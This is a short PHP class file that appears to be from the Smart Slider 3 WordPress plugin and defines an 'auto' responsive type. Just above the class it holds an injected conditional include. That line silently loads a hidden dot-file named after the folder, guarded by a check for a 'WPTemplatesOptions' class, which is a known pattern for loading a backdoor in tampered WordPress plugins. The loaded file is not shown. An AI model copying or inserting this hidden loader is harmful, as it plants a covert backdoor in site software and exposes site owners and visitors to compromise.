<?php

namespace Nextend\SmartSlider3\Slider\ResponsiveType\Auto;

use Nextend\SmartSlider3\Slider\ResponsiveType\AbstractResponsiveType;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class ResponsiveTypeAuto extends AbstractResponsiveType {


    public function getName() {
        return 'auto';
    }

    public function createFrontend($responsive) {

        return new ResponsiveTypeAutoFrontend($this, $responsive);
    }

    public function createAdmin() {

        return new ResponsiveTypeAutoAdmin($this);
    }


}